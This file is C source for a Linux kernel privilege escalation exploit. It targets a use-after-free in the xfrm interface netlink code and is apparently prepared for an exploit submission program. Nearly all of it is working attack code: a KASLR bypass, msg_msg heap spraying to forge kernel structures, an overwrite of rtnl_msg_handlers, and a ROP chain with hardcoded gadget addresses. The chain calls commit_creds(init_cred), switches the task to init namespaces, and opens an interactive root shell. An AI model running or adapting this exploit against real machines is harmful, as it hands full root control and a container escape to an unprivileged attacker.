#define _GNU_SOURCE
#include <features.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <errno.h>
#include <ctype.h>
#include <netdb.h>

#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/sysinfo.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <netlink/msg.h>
#include <netlink/attr.h>
#include <netlink/netlink.h>

#include "xfrm_netlink.h"
#include "gen.h"
#include "leak.h"

#define NETDEV_PRIV 0x900 //the offset in function netdev_priv
#define SIZEOF_MSG_MSG 0x30 + 8 
#define OFFSET_XFRM_IF_DEV 0x8 //offset(struct xfrm_if, dev)
#define OFFSET_XFRM_IF_NET 0x10 //offset(struct xfrm_if, net)
#define OFFSET_XFRM_IF_P_LINKID_AND_P_IFID 0x18 //offset (struct xfrm_if, p.link)
#define OFFSET_XFRM_IF_P_COLLECT_MD 0x20 //offset (struct xfrm_if, p.collect_md)
#define OFFSET_NET_GEN 0xAB8 //offset(struct net, gen)
#define TEST1_ID 0x10
#define TEST2_ID 0x101
#define TEST3_ID 0x102
#define TEST4_ID 0x103

#define ADDR_OF_RTNL_MSG_HANDLERS 0xFFFFFFFF847D8680 //address of rtnl_msg_handlers
#define XFRMI_NET_ID_VALUE 0x2d //value of xfrmi_net_id, get it from debugging
#define HASH_OF_TEST1_ID 0x1c // the value of xfrmi_hash(TEST1_ID), get it from debugging
#define MSG_SIZE 0x1000
#define SIZEOF_ROP 0x100
#define FIRST_GADGET 0xffffffff812d86d8 //leave ; pop rbx ; pop rbp ; mov eax, ecx ; pop r12 ; pop r13 ; ret
#define POP_RDI_RET 0xffffffff81039273 //pop rdi ; ret
#define INIT_CRED 0xFFFFFFFF83A75F00 //init_cred
#define COMMIT_CREDS 0xffffffff811d55c0 //commit_creds
#define FIND_TASK_BY_VPID 0xffffffff811cbf30 //find_task_by_vpid
#define OR_RDI_RAX_RET 0xffffffff818d34f5 //or rdi, rax ; test rdi, rdi ; setne al ; ret
#define POP_RSI_RET 0xffffffff811e9296 //pop rsi ; ret
#define INIT_NSPROXY 0xFFFFFFFF83A75CC0 //init_nsproxy
#define SWITCH_TASK_NAMESPACES 0xffffffff811d3a40 // switch_task_namespaces
#define SWAPGS_RET 0xffffffff822b91ad //swapgs; ret
#define IRETQ 0xFFFFFFFF82401260 //iretq

#define NUM_SPRAY_MSQIDS_STEP4 0x80
#define NUM_SPRAY_MSQIDS_TOTAL 0x7000
#define NUM_SPRAY_REPEAT_NUM 4


int error_num = 0;

unsigned long user_cs,user_ss,user_rsp,user_rflags;

void shell(void) {
        printf("ret2usr success! uid : %d\n",getuid());
        char *args[] = {"/bin/sh", "-i", NULL};
        execve(args[0], args, NULL);
}

static void save_state() {
        asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_rsp),"=r" (user_rflags) : : "memory");
}

int write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp) {
  *(long *)msgp = msgtyp;
  if (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) < 0) {
    perror("[-] msgsnd");
    return -1;
  }
  return 0;
}

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0) < 0) {
    perror("[-] msgrcv");
    return -1;
  }
  return 0;
}

int nl_callback_get_error_num(struct nl_msg* recv_msg, void* arg)
{

    struct nlmsghdr * ret_hdr = nlmsg_hdr(recv_msg);

    if (ret_hdr->nlmsg_type == NLMSG_ERROR) {
        //printf("Received NLMSG_ERROR message!\n");
	struct nlmsgerr *errmsg = nlmsg_data(ret_hdr);
	error_num = errmsg->error;
        return NL_STOP;
    }
}

static int clr_flag(char *ifname, short flag)
{
        struct ifreq ifr;
        int fd,skfd;

        /* Create a channel to the NET kernel. */
        if ((skfd = socket(AF_INET,SOCK_DGRAM ,0)) < 0) {
                perror("socket");
                exit(1);
        }

        fd = skfd;

        strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
        if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) {
                fprintf(stderr, "%s: unknown interface: %s\n",
                                ifname, strerror(errno));
                return -1;
        }
        strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
        if(flag == 1)
                ifr.ifr_flags &= ~IFF_UP;
        else if(flag == 2)
                ifr.ifr_flags |= IFF_UP;
        if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) {
                perror("SIOCSIFFLAGS");
                return -1;
        }
        return (0);
}

int setup_sandbox(void) {
  
  if (unshare(CLONE_NEWUSER) < 0) {
    perror("[-] unshare(CLONE_NEWUSER)");
    return -1;
  }
  
  if (unshare(CLONE_NEWNET) < 0) {
    perror("[-] unshare(CLONE_NEWNET)");
    return -1;
  }
  
}
void pin_on_cpu(int cpu) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(cpu, &cpu_set);
  if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
    perror("sched_setaffinity()");
    exit(EXIT_FAILURE);
  }
  usleep(1000);
}

int main(void) {
    
    char * message = malloc(MSG_SIZE);
    memset(message,0x41,MSG_SIZE);
    char * read_message = malloc(MSG_SIZE);
    memset(read_message, 0x41, MSG_SIZE);
    int msqid[NUM_SPRAY_MSQIDS_TOTAL];
    save_state();
    pin_on_cpu(0);
    if (setup_sandbox() < 0){
        printf("Create sandbox fail!\n");
        return 0;
    }

    clr_flag("lo",2);
    //Step 1
    uint64_t kernel_off = bypass_kaslr(0);
    uint64_t base = bypass_kaslr2(0);
    
    printf("Step 1 finish ! %llx %llx\n", kernel_off, base);
    
    struct nl_sock * socket = nl_socket_alloc();

    if(nl_connect(socket,NETLINK_ROUTE)<0){
    		printf("nfnl_connect fail!\n");
		return 0;
    }
    //Step 2
    create_xfrm_link_collect(socket, "test1"); //For triggering the vulnerability
    	
    change_xfrm_link(socket, "test1", TEST1_ID);
    
    create_xfrm_link_with_ifid(socket, "test2", TEST2_ID);//For memory forging different structures
    create_xfrm_link_with_ifid(socket, "test3", TEST3_ID);//For memory forging different structures
    create_xfrm_link_with_ifid(socket, "test4", TEST4_ID);//For memory forging different structures
    //Prepare for heap spray
    for (int i = 0; i < NUM_SPRAY_MSQIDS_TOTAL; i++) {
        if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
                perror("[-] msgget");
                return 0;
        }
    }
    //Step 3
    delete_xfrm_link(socket, "test1");
    
    //Step 4
    #ifdef KASLR_BYPASS_INTEL
    //for online environment
        uint64_t offset = 0;
    #else
    //for PR check
        uint64_t offset = 0x100000000;
    #endif
    uint64_t address_of_test2_dev = 0;
    uint64_t address_of_test3_dev = 0;
    uint64_t address_of_test4_dev = 0;
    nl_socket_modify_cb(socket,NL_CB_MSG_IN, NL_CB_CUSTOM, nl_callback_get_error_num, NULL);
    //find the address of `test2`->dev by error number because of the difference between -EEXIST and -EINVAL
    for (int i = 0; i < 0x10000; i++){
	*(uint64_t *)&message[NETDEV_PRIV-SIZEOF_MSG_MSG+OFFSET_XFRM_IF_DEV] = base + offset + i*0x1000; //fake  xfrm_if->dev
    	*(uint64_t *)&message[NETDEV_PRIV-SIZEOF_MSG_MSG+OFFSET_XFRM_IF_P_LINKID_AND_P_IFID] = 0x1000000000; //p.link_id and p.if_id
	//spray heap to pad the free `test1`->dev
	for (int j = 0; j < NUM_SPRAY_MSQIDS_STEP4; j++) {
	    if (write_msg(msqid[j], message, MSG_SIZE-0x100, 0x41) < 0) {
		    perror("[-] msgsnd");
		    return 0;
	    }
    	}
	if(address_of_test2_dev==0){
		change_xfrm_link(socket, "test2", TEST1_ID);
		nl_recvmsgs_default(socket);
	
		if(error_num==-EINVAL){//if the error number is -EINVAL, it means we get the correct address of `test2`->dev
			address_of_test2_dev = base + offset + i*0x1000;
			printf("Get address of test2 dev : %llx\n", address_of_test2_dev);
			if(address_of_test3_dev!=0&&address_of_test4_dev!=0)
				break;
		}
	}
	if(address_of_test3_dev==0){
		change_xfrm_link(socket, "test3", TEST1_ID);
                nl_recvmsgs_default(socket);

                if(error_num==-EINVAL){//if the error number is -EINVAL, it means we get the correct address of `test2`->dev
                        address_of_test3_dev = base + offset + i*0x1000;
                        printf("Get address of test3 dev : %llx\n", address_of_test3_dev);
                        change_xfrm_link(socket, "test3", TEST3_ID);
                        if(address_of_test2_dev!=0&&address_of_test4_dev!=0)
				break;
                }
	}
	if(address_of_test4_dev==0){
                change_xfrm_link(socket, "test4", TEST1_ID);
                nl_recvmsgs_default(socket);

                if(error_num==-EINVAL){//if the error number is -EINVAL, it means we get the correct address of `test2`->dev
                        address_of_test4_dev = base + offset + i*0x1000;
                        printf("Get address of test4 dev : %llx\n", address_of_test4_dev);
                        change_xfrm_link(socket, "test4", TEST4_ID);
                        if(address_of_test2_dev!=0&&address_of_test3_dev!=0)
                                break;
                }
        }
	
	//Free the heap of `test1`->dev to pad again
	for (int j = 0; j < NUM_SPRAY_MSQIDS_STEP4; j++) {
	    if (read_msg(msqid[j], read_message, 0xf00, 0x41) < 0) {
                    perror("[-] msgrcv");
                    return 0;
            }
	}
    }
    
    if(address_of_test2_dev==0||address_of_test3_dev==0||address_of_test4_dev==0){
    	printf("Get address of test2 dev fail.\n");
	exit(0);
    }
    
    //Step 5 
    //now we try to pad the heap of test3, free it first
    delete_xfrm_link(socket, "test3");
    *(uint64_t *)&message[NETDEV_PRIV-SIZEOF_MSG_MSG+OFFSET_XFRM_IF_DEV-0x28] = address_of_test3_dev + 0x8e8 - 8*XFRMI_NET_ID_VALUE; // xfrm_if->dev, will be treated as xfrmi_net->xfrmi[]
    *(uint64_t *)&message[NETDEV_PRIV-SIZEOF_MSG_MSG+OFFSET_XFRM_IF_NET-0x28] = ADDR_OF_RTNL_MSG_HANDLERS + kernel_off + 8 - HASH_OF_TEST1_ID * 8; //xfrm_if->net (fake), will be treated as struct  xfrm_if *, 0xFFFFFFFF847D8680 = rtnl_msg_handlers
    //why -0x28? don't know, after debug we need it.
    sleep(1);				
    //Pad the heap of test3's struct net_device by heap spray
    for (int j = NUM_SPRAY_MSQIDS_STEP4; j < NUM_SPRAY_MSQIDS_TOTAL; j++) {
            if (write_msg(msqid[j], message, MSG_SIZE-0x100, 0x41) < 0) {
                    perror("[-] msgsnd");
                    return 0;
            }
    }
    for ( int i = 1; i < NUM_SPRAY_REPEAT_NUM ; i++){
        sleep(0.1);
        for ( int j = 0; j < NUM_SPRAY_MSQIDS_TOTAL; j++){
        if (write_msg(msqid[j], message, MSG_SIZE-0x100, 0x41 + i) < 0) {
                perror("[-] msgsnd");
                return 0;
        }
    }
    }
    //Step 6
    //Now free the heap of test1 we pad in step 4 by freeing the heap spray we use in step 4.
    for (int j = 0; j < NUM_SPRAY_MSQIDS_STEP4; j++) {
        if (read_msg(msqid[j], read_message, MSG_SIZE-0x100, 0x41) < 0) {
                perror("[-] msgrcv");
                return 0;
        }
    }
    //Pad the heap of test1 again.
    memset(message, 0x41, MSG_SIZE);
    *(uint64_t *)&message[NETDEV_PRIV-SIZEOF_MSG_MSG+OFFSET_XFRM_IF_DEV] = address_of_test2_dev; // xfrm_if->dev, pass the check of if (xi->dev != dev)
    *(uint64_t *)&message[NETDEV_PRIV-SIZEOF_MSG_MSG+OFFSET_XFRM_IF_NET] = address_of_test3_dev + 0x8e0 - OFFSET_NET_GEN; //fake xi->net, point to the heap of test3 which we pad before in step 3. debug get 0x8e0
    *(uint64_t *)&message[NETDEV_PRIV-SIZEOF_MSG_MSG+OFFSET_XFRM_IF_P_LINKID_AND_P_IFID] = 0x1000000000; //xfrm_if->p.link_id and xfrm_if->p.if_id
    *(uint64_t *)&message[NETDEV_PRIV-SIZEOF_MSG_MSG+OFFSET_XFRM_IF_P_COLLECT_MD] = 0;//xfrm_if->p.collect_md
    for (int j = 0; j < NUM_SPRAY_MSQIDS_STEP4; j++) {
            if (write_msg(msqid[j], message, MSG_SIZE-0x100, 0x41) < 0) {
                    perror("[-] msgsnd");
                    return 0;
            }
    }
    //Step 7
    //Now try to overwrite &rtnl_msg_handlers+8
    change_xfrm_link(socket, "test2", TEST1_ID);//Here will finally overwrite rtnl_msg_handlers[1] = struct net_device of test1 + NETDEV_PRIV
    
    //Step 8, build a fake rtnl_msg_handlers[1]
    //Delete the heap used spray for test1
    for (int j = 0; j < NUM_SPRAY_MSQIDS_STEP4; j++) {
        if (read_msg(msqid[j], read_message, MSG_SIZE-0x100, 0x41) < 0) {
                perror("[-] msgrcv");
                return 0;
        }
    }
    //Heap spray to re-pad it.
    memset(message, 0x41, MSG_SIZE);
    *(uint64_t *)&message[NETDEV_PRIV-SIZEOF_MSG_MSG+OFFSET_XFRM_IF_DEV] = address_of_test3_dev + NETDEV_PRIV + OFFSET_XFRM_IF_DEV; 
    *(uint64_t *)&message[NETDEV_PRIV-SIZEOF_MSG_MSG+OFFSET_XFRM_IF_P_LINKID_AND_P_IFID] = 0x1000000000; 
    *(uint64_t *)&message[NETDEV_PRIV-SIZEOF_MSG_MSG+OFFSET_XFRM_IF_P_COLLECT_MD] = 1;
    //Now we pad the heap of test2 again
    for (int j = 0; j < NUM_SPRAY_MSQIDS_STEP4; j++) {
            if (write_msg(msqid[j], message, MSG_SIZE-0x100, 0x41) < 0) {
                    perror("[-] msgsnd");
                    return 0;
            }
    }
    //Free the heap of test3 again
    for (int j = NUM_SPRAY_MSQIDS_STEP4; j < NUM_SPRAY_MSQIDS_TOTAL; j++) {
            if (read_msg(msqid[j], read_message,  MSG_SIZE-0x100, 0x41) < 0) {
                    perror("[-] msgsnd");
                    return 0;
            }
    }
    for ( int i = 1; i < NUM_SPRAY_REPEAT_NUM ; i++){
        sleep(0.1);
        for ( int j = 0; j < NUM_SPRAY_MSQIDS_TOTAL; j++){
        if (read_msg(msqid[j], read_message,  MSG_SIZE-0x100, 0x41 + i) < 0) {
                perror("[-] msgsnd");
                return 0;
        }
    }
    }
    memset(message, 0, MSG_SIZE);
    *(uint64_t *)&message[NETDEV_PRIV-SIZEOF_MSG_MSG+OFFSET_XFRM_IF_DEV] = FIRST_GADGET + kernel_off ; //will be treated as rtnl_link->doit. leave ; pop rbx ; pop rbp ; mov eax, ecx ; pop r12 ; pop r13 ; ret                                            
    sleep(1);
    //Pad the heap of test3 again
    for (int j = NUM_SPRAY_MSQIDS_STEP4; j < NUM_SPRAY_MSQIDS_TOTAL; j++) {
            if (write_msg(msqid[j], message, MSG_SIZE-0x100, 0x41) < 0) {
                    perror("[-] msgsnd");
                    return 0;
            }
    }
    for ( int i = 1; i < NUM_SPRAY_REPEAT_NUM ; i++){
        sleep(0.1);
        for ( int j = 0; j < NUM_SPRAY_MSQIDS_TOTAL; j++){
        if (write_msg(msqid[j], message, MSG_SIZE-0x100, 0x41 + i) < 0) {
                perror("[-] msgsnd");
                return 0;
        }
    }
    }
    
    //Final step, trigger the ROP
    struct nl_msg * msg = nlmsg_alloc();
    struct nlmsghdr *hdr1 = nlmsg_put(
            msg,
            NL_AUTO_PORT, // auto assign current pid
            NL_AUTO_SEQ, // begin wit seq number 0
            1 + RTM_BASE,   // TYPE, 1, means use rtnl_msg_handlers[1]
            sizeof(struct ifinfomsg) + SIZEOF_ROP,
            NLM_F_REQUEST
    );
    struct ifinfomsg * h = malloc(sizeof(struct ifinfomsg) + SIZEOF_ROP);
    memset(h, 0, sizeof(struct ifinfomsg));
    h->ifi_family = 1; //means use rtnl_msg_handlers[1][1]
    char * ops = &h[1];
    //Now we pad ROPgadget
    *(uint64_t *)&ops[0x08] = kernel_off + POP_RDI_RET;//pop rdi; ret
    *(uint64_t *)&ops[0x10] = kernel_off + INIT_CRED;//init_cred
    *(uint64_t *)&ops[0x18] = kernel_off + COMMIT_CREDS;//commit_creds;
    *(uint64_t *)&ops[0x20] = kernel_off + POP_RDI_RET;//pop rdi ; ret
    *(uint64_t *)&ops[0x28] = 1;//rdi
    *(uint64_t *)&ops[0x30] = kernel_off + FIND_TASK_BY_VPID;//find_task_by_vpid
    *(uint64_t *)&ops[0x38] = kernel_off + POP_RDI_RET;//pop rdi; ret
    *(uint64_t *)&ops[0x40] = 0;//rdi
    *(uint64_t *)&ops[0x48] = kernel_off + OR_RDI_RAX_RET;//or rdi, rax ; test rdi, rdi ; setne al ; ret
    *(uint64_t *)&ops[0x50] = kernel_off + POP_RSI_RET;//pop rsi ; ret
    *(uint64_t *)&ops[0x58] = kernel_off + INIT_NSPROXY;//init_nsproxy
    *(uint64_t *)&ops[0x60] = kernel_off + SWITCH_TASK_NAMESPACES; //switch_task_namespaces
    *(uint64_t *)&ops[0x68] = kernel_off + SWAPGS_RET;//swappgs; ret
    *(uint64_t *)&ops[0x70] = kernel_off + IRETQ;//iretq
    *(uint64_t *)&ops[0x78] = (uint64_t)shell;
    *(uint64_t *)&ops[0x80] = user_cs;
    *(uint64_t *)&ops[0x88] = user_rflags;
    *(uint64_t *)&ops[0x90] = user_rsp;
    *(uint64_t *)&ops[0x98] = user_ss;

    memcpy(nlmsg_data(hdr1), h, sizeof(struct ifinfomsg) + 0x100);
    uint32_t total_size = NLMSG_ALIGN(hdr1->nlmsg_len);
    char *buf = malloc(total_size);
    memset(buf,0,total_size);
    memcpy(buf,hdr1,NLMSG_ALIGN(hdr1->nlmsg_len));
    int res = nl_sendto(socket, buf, total_size);
    
    while(1);
    
    return 0;
}
